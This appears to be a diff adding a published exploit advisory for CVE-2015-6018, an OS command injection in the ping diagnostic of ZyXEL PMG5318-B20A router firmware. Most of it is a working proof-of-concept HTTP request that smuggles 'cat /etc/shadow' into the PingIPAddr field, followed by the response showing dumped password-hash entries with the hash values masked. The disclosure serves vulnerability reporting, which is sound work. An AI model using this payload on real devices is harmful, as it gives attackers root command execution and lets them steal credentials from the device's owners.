@@ -1,0 +1,69 @@
+# Exploit Title: [ZyXEL PMG5318-B20A OS Command Injection Vulnerability]
+# Discovered by: Karn Ganeshen
+# CERT VU# 870744
+# Vendor Homepage: [www.zyxel.com]
+# Version Reported: [Firmware version V100AANC0b5]
+# CVE-2015-6018 [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6018]
+
+
+*Vulnerability Details*
+
+CWE-20 <http://cwe.mitre.org/data/definitions/20.html>: Improper Input
+Validation - CVE-2015-6018
+
+The diagnostic ping function's PingIPAddr parameter in the ZyXEL
+PMG5318-B20A, firmware version V100AANC0b5, does not properly validate user
+input. An attacker can execute arbitrary commands as root.
+
+*OS Command Injection PoC*
+
+The underlying services are run as 'root'. It therefore, allows dumping
+system password hashes.
+
+*HTTP Request*
+
+POST /diagnostic/diagnostic_general.cgi HTTP/1.1
+Host: <IP>
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101
+Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://<IP>/diagnostic/diagnostic_general.cgi
+Cookie: session=a457f8ad83ba22dc256cd0b002c66666 Connection: keep-alive
+Content-Type: multipart/form-data; boundary=--------------------------
+-12062103314079176991367286444
+Content-Length: 451
+
+——————————————12062103314079176991367286444
+Content-Disposition: form-data; name="InfoDisplay”
+——————————————12062103314079176991367286444
+Content-Disposition: form-data; name="*PingIPAddr*"
+*8.8.8.8; cat /etc/shadow *
+——————————————12062103314079176991367286444
+Content-Disposition: form-data; name="Submit"
+Ping
+….
+*HTTP Response *
+.....
+<snipped>
+<br class="clearfloat" />
+<!-- configuration beginning -->
+<div class="headline"><span class="cTitle">General</span></div> <table
+width="90%" border="0" align="center" cellpadding="0" cellspacing="0"
+class="cfgpadding">
+<tr>
+<td nowrap="nowrap"><textarea name="InfoDisplay" rows="15" cols="100"
+readonly="readonly”>
+
+
+*root:<hash>:15986:0:99999:7:::
+lp:*:13013:0:99999:7:::nobody:*:13013:0:99999:7:::admin:<hash>:16035:0:99999:7:::
+user:<hash>:16035:0:99999:7:::*
+ &lt;/textarea&gt;</td>
+</tr>
+</table>
+<table width="90%" border="0" align="center" cellpadding="0"
+cellspacing="0" class="cfgpadding">
+<tr>
+-----------------------------12062103314079176991367286444--
